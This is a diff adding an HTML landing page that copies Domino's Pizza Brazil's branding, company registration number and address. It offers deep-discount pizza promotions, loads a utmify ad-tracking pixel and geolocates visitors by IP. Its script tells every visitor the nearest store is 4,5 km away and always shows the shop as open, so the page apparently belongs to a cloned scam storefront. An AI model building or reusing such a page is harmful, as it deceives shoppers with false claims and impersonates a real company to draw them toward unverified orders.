@@ -1,0 +1,312 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    
+    <script>
+  window.pixelId = "686dab79d183c9d039f94056";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Domino's Pizza - Peça Online!</title>
+    <meta name="description" content="Faça seu pedido online na Domino's Pizza. As melhores pizzas e promoções!">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Font Awesome (para ícones) -->
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
+
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="images/dominos-pizza-logo.png" type="image/png">
+    
+    <meta name="theme-color" content="#006491">
+
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f0f2f5; }
+        .font-dominos { font-family: 'Oswald', sans-serif; }
+        .btn-pisca { animation: pisca 1s infinite; }
+        @keyframes pisca { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .footer-bg { background-color: #00324e; }
+        .dominos-blue-text { color: #006491; }
+        .bg-dominos-blue { background-color: #006491; }
+        .bg-dominos-red { background-color: #E31837; }
+        .hover\:bg-dominos-red-dark:hover { background-color: #c8102a; }
+    </style>
+</head>
+
+<body class="bg-gray-100">
+
+    <!-- Cabeçalho -->
+    <header id="topo" class="sticky top-0 z-20">
+        <div class="bg-dominos-blue text-white p-3 shadow-lg">
+            <div class="container mx-auto flex justify-between items-center">
+                <button class="text-2xl w-8 text-left" title="Menu"><i class="fas fa-bars"></i></button>
+                <a href="index.html" title="Página Inicial"><img src="images/dominos-pizza-logo.png" alt="Logotipo da Domino's" class="h-8"></a>
+                <a href="#" onclick="iniciarVerificacaoLocal(true)" title="Verificar localização" class="text-2xl w-8 text-right"><i class="fas fa-map-marker-alt"></i></a>
+            </div>
+        </div>
+        <div class="bg-white shadow-md">
+            <div class="container mx-auto p-3">
+                <div class="flex justify-center items-center flex-wrap gap-x-4 sm:gap-x-6 gap-y-2 text-sm text-gray-700">
+                    <div class="font-medium"><i class="fa-solid fa-motorcycle text-gray-500 mr-1"></i><span><b>30-50</b> min • <span class="text-green-600 font-bold">Grátis</span></span></div>
+                    <div class="font-bold text-gray-800"><i class="fas fa-map-marker-alt dominos-blue-text mr-1"></i><span id="localCidade">Defina sua localização</span> - <span id="localEstado"></span></div>
+                    <div class="inline-flex items-center bg-green-100 text-green-800 text-xs font-bold px-3 py-1 rounded-full"><i class="fa-solid fa-circle btn-pisca text-green-500 mr-2"></i><span>ABERTO</span></div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main id="lista" class="container mx-auto p-4 max-w-3xl">
+        
+        <div class="my-6">
+            <div class="max-w-xl mx-auto text-center rounded-lg shadow-lg overflow-hidden">
+                <div class="bg-white p-6"><h2 class="font-dominos text-3xl md:text-4xl dominos-blue-text uppercase tracking-wider">Sua pizza favorita está aqui</h2></div>
+                <a href="#ofertas" class="block w-full bg-dominos-red text-white font-dominos text-2xl uppercase py-4 px-10 hover:bg-dominos-red-dark transition-colors duration-300">Pedir minha pizza</a>
+            </div>
+        </div>
+
+        <div id="ofertas" class="space-y-6 mt-8">
+            <a href="promocoes/2-pizzas-medias.html/index.html" class="block rounded-lg shadow-lg hover:shadow-xl transition-shadow duration-300 overflow-hidden"><img src="images/2pizzas32%2C90.png" alt="[Banner da promoção de 2 pizzas por R$32,90]" class="w-full h-auto"></a>
+            <a href="promocoes/pizza-g-refri.html/index.html" class="block rounded-lg shadow-lg hover:shadow-xl transition-shadow duration-300 overflow-hidden"><img src="images/pizzag%2Brefri.png" alt="[Banner da promoção de pizza grande mais refri]" class="w-full h-auto"></a>
+            <a href="promocoes/compre-1-leve-2.html/index.html" class="block rounded-lg shadow-lg hover:shadow-xl transition-shadow duration-300 overflow-hidden"><img src="images/compre1leve2.png" alt="[Banner da promoção Compre 1 Leve 2]" class="w-full h-auto"></a>
+        </div>
+
+        <section id="cardapio" class="mt-10">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-8 pb-4 border-b-2 border-gray-200">Explore nosso cardápio</h2>
+            <div class="space-y-4">
+                <a href="pizzas.html/index.html" class="flex items-center p-4 bg-white rounded-lg shadow-md border-l-4 border-dominos-red hover:shadow-xl hover:scale-105 transition-all duration-300"><img src="images/specialty.webp" alt="" class="w-20 h-20 object-contain rounded-md mr-6"><span class="font-bold text-xl text-gray-700">Pizzas</span></a>
+                <a href="sanduiches.html/index.html" class="flex items-center p-4 bg-white rounded-lg shadow-md border-l-4 border-dominos-red hover:shadow-xl hover:scale-105 transition-all duration-300"><img src="images/sandwiches.webp" alt="" class="w-20 h-20 object-contain rounded-md mr-6"><span class="font-bold text-xl text-gray-700">Sanduíches</span></a>
+                <a href="sobremesas.html/index.html" class="flex items-center p-4 bg-white rounded-lg shadow-md border-l-4 border-dominos-red hover:shadow-xl hover:scale-105 transition-all duration-300"><img src="images/dessert.webp" alt="" class="w-20 h-20 object-contain rounded-md mr-6"><span class="font-bold text-xl text-gray-700">Sobremesas</span></a>
+                <a href="bebidas.html/index.html" class="flex items-center p-4 bg-white rounded-lg shadow-md border-l-4 border-dominos-red hover:shadow-xl hover:scale-105 transition-all duration-300"><img src="images/drinks.webp" alt="" class="w-20 h-20 object-contain rounded-md mr-6"><span class="font-bold text-xl text-gray-700">Bebidas</span></a>
+            </div>
+        </section>
+    </main>
+    
+    <footer class="footer-bg text-white mt-12">
+        <div class="container mx-auto px-6 py-12">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-8 mb-8">
+                <div class="space-y-4"><h3 class="font-bold uppercase tracking-wider">Domino's</h3><ul class="space-y-2"><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Sobre a Domino's</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Cardápio</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Lojas</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Promoções</a></li></ul></div>
+                <div class="space-y-4"><h3 class="font-bold uppercase tracking-wider">Ajuda</h3><ul class="space-y-2"><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Fale Conosco</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Nutricional</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Alérgicos</a></li></ul></div>
+                <div class="space-y-4"><h3 class="font-bold uppercase tracking-wider">Mais</h3><ul class="space-y-2"><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Franquias</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Trabalhe Conosco</a></li><li><a href="#" class="text-gray-300 hover:text-white transition-colors">Imprensa</a></li></ul></div>
+                <div class="space-y-4"><h3 class="font-bold uppercase tracking-wider">Siga-nos</h3><div class="flex space-x-4"><a href="#" class="text-gray-300 hover:text-white transition-colors"><i class="fab fa-facebook-f fa-lg"></i></a><a href="#" class="text-gray-300 hover:text-white transition-colors"><i class="fab fa-instagram fa-lg"></i></a><a href="#" class="text-gray-300 hover:text-white transition-colors"><i class="fab fa-youtube fa-lg"></i></a><a href="#" class="text-gray-300 hover:text-white transition-colors"><i class="fab fa-tiktok fa-lg"></i></a></div></div>
+            </div>
+            <div class="flex flex-col md:flex-row items-center justify-center space-y-4 md:space-y-0 md:space-x-4 mb-8">
+                <a href="#"><img src="images/download-on-the-app-store.svg" alt="[Logótipo da App Store]" class="h-12"></a>
+                <a href="#"><img src="images/pt-br_badge_web_generic.png" alt="[Logótipo da Google Play]" class="h-16"></a>
+            </div>
+            <div class="border-t border-gray-700 pt-6 text-center text-gray-400 text-xs">
+                <p>Preços e condições exclusivas para o site e televendas, podendo sofrer alterações sem prévia notificação.</p>
+                <p class="mt-4">DOMINO'S PIZZA BRASIL, CNPJ: 07.173.309/0001-22, Avenida das Américas, nº 500, Bloco 7, Loja 301 - Barra da Tijuca, Rio de Janeiro/RJ - CEP 22.640-100</p>
+                <p class="mt-4">� 2024 Domino's Pizza. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script>
+        // --- LOCATION LOGIC ---
+
+        function setCookie(name, value, days) {
+            let expires = new Date(Date.now() + days * 864e5).toUTCString();
+            document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
+        }
+
+        function getCookie(name) {
+            let value = "; " + document.cookie;
+            let parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return decodeURIComponent(parts.pop().split(";").shift());
+        }
+
+        function checkCookie(nome) {
+            return getCookie(nome) !== undefined;
+        }
+
+        async function fetchLocation() {
+            try {
+                let response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                let { city = "Sua Cidade", region = "Seu Estado" } = await response.json();
+                return { city, region };
+            } catch (error) {
+                console.error('Erro ao obter a localização:', error);
+                return { city: "Sua Cidade", region: "Seu Estado" };
+            }
+        }
+
+        async function atualizarLocalizacao(cidade, estado) {
+            const localCidadeSpan = document.getElementById('localCidade');
+            const localEstadoSpan = document.getElementById('localEstado');
+            if (cidade && estado) {
+                const siglaEstado = estado.includes(' - ') ? estado.split(' - ')[1] : estado;
+                localCidadeSpan.textContent = cidade;
+                localEstadoSpan.textContent = siglaEstado;
+            }
+        }
+        
+        // Function to show a styled success confirmation
+        function mostrarConfirmacaoSucesso(city, state) {
+            const stateAbbreviation = state.includes(' - ') ? state.split(' - ')[1] : state;
+            Swal.fire({
+                title: 'Localização confirmada!',
+                icon: 'success',
+                html: `
+                    <div class="text-center">
+                        <p class="text-lg font-semibold">${city} - ${stateAbbreviation}</p>
+                        <div class="bg-blue-50 text-left text-blue-900 p-4 rounded-lg my-4 text-sm space-y-2 border border-blue-200 shadow-inner">
+                            <p><i class="fas fa-store-alt fa-fw mr-2 text-blue-500"></i>A Domino's mais perto de você fica a <b>4,5 km</b>.</p>
+                            <p><i class="fas fa-clock fa-fw mr-2 text-blue-500"></i>Tempo de entrega médio de <b>30-50 minutos</b>.</p>
+                        </div>
+                    </div>
+                `,
+                confirmButtonText: 'Continuar',
+                confirmButtonColor: '#006491' // Domino's Blue
+            });
+        }
+
+        async function escolherLocalizacaoManualmente(detectedRegion) {
+            const { value: stateData } = await Swal.fire({
+                title: 'Onde você está?',
+                text: "Selecione seu estado para continuar.",
+                input: 'select',
+                inputPlaceholder: 'Selecione o estado',
+                confirmButtonText: 'Próximo <i class="fa fa-arrow-right"></i>',
+                confirmButtonColor: '#006491',
+                allowOutsideClick: false,
+                inputOptions: (async () => {
+                    try {
+                        const response = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados?orderBy=nome');
+                        const states = await response.json();
+                        const options = {};
+                        states.forEach(state => {
+                            options[JSON.stringify({id: state.id, sigla: state.sigla, nome: state.nome})] = `${state.nome} (${state.sigla})`;
+                        });
+                        return options;
+                    } catch (error) { return { error: 'Não foi possível carregar os estados' }; }
+                })(),
+                preConfirm: (value) => {
+                    if (!value) { Swal.showValidationMessage('Você precisa selecionar um estado!'); }
+                    return JSON.parse(value);
+                },
+                didOpen: () => {
+                    if(detectedRegion) {
+                        const select = Swal.getInput();
+                        for (let i = 0; i < select.options.length; i++) {
+                            const option = select.options[i];
+                            if (option.text.includes(detectedRegion)) {
+                                select.value = option.value;
+                                break;
+                            }
+                        }
+                    }
+                }
+            });
+
+            if (stateData) {
+                const { value: city } = await Swal.fire({
+                    title: 'Agora, sua cidade',
+                    text: `Selecione sua cidade em ${stateData.nome}.`,
+                    input: 'select',
+                    inputPlaceholder: 'Selecione a cidade',
+                    confirmButtonText: 'Confirmar',
+                    confirmButtonColor: '#006491',
+                    allowOutsideClick: false,
+                    inputOptions: (async () => {
+                        try {
+                            const response = await fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${stateData.id}/municipios?orderBy=nome`);
+                            const cities = await response.json();
+                            const options = {};
+                            cities.forEach(city => { options[city.nome] = city.nome; });
+                            return options;
+                        } catch (error) { return { error: 'Não foi possível carregar as cidades' }; }
+                    })(),
+                     inputValidator: (value) => { if (!value) { return 'Você precisa selecionar uma cidade!' } }
+                });
+
+                if (city) {
+                    Swal.fire({
+                        title: 'Verificando localização...',
+                        html: '<div class="flex flex-col items-center"><div class="w-8 h-8 border-4 border-t-blue-500 border-gray-200 rounded-full animate-spin"></div><p class="mt-2">Aguarde um momento</p></div>',
+                        timer: 1500,
+                        showConfirmButton: false,
+                        allowOutsideClick: false
+                    }).then(() => {
+                        const estadoCompleto = `${stateData.nome} - ${stateData.sigla}`;
+                        setCookie("localCidade", city, 365);
+                        setCookie("localEstado", estadoCompleto, 365);
+                        atualizarLocalizacao(city, estadoCompleto);
+                        mostrarConfirmacaoSucesso(city, stateData.sigla);
+                    });
+                }
+            }
+        }
+
+        async function iniciarVerificacaoLocal(forceCheck = false) {
+             if (!forceCheck && checkCookie("localCidade") && checkCookie("localEstado")) {
+                atualizarLocalizacao(getCookie("localCidade"), getCookie("localEstado"));
+                return;
+            }
+            
+            const { city, region } = await fetchLocation();
+
+            Swal.fire({
+                title: 'Confirme sua localização',
+                html: `
+                    <div class="text-center">
+                        <i class="fas fa-map-marker-alt text-4xl text-blue-500 mb-4"></i>
+                        <h2 class="text-xl font-semibold">Detectamos sua localização!</h2>
+                        <div class="bg-gray-100 p-3 rounded-lg my-4">
+                            <p class="text-lg font-bold">${city}</p>
+                            <p class="text-sm text-gray-600">${region}</p>
+                        </div>
+                        <p class="text-gray-600">Esta é sua localização atual?</p>
+                    </div>
+                `,
+                showCancelButton: true,
+                confirmButtonText: 'Sim, confirmar',
+                cancelButtonText: 'Não, escolher outro local',
+                confirmButtonColor: '#E31837',
+                cancelButtonColor: '#6B7280',
+                customClass: { popup: 'rounded-xl' }
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    setCookie("localCidade", city, 365);
+                    setCookie("localEstado", region, 365);
+                    atualizarLocalizacao(city, region);
+                    mostrarConfirmacaoSucesso(city, region);
+                } else if (result.dismiss === Swal.DismissReason.cancel) {
+                    escolherLocalizacaoManualmente(region);
+                }
+            });
+        }
+
+        $(document).ready(function() {
+            iniciarVerificacaoLocal();
+
+            $('a[href^="#ofertas"]').on('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+
+    </script>
+
+
+
+</body></html>
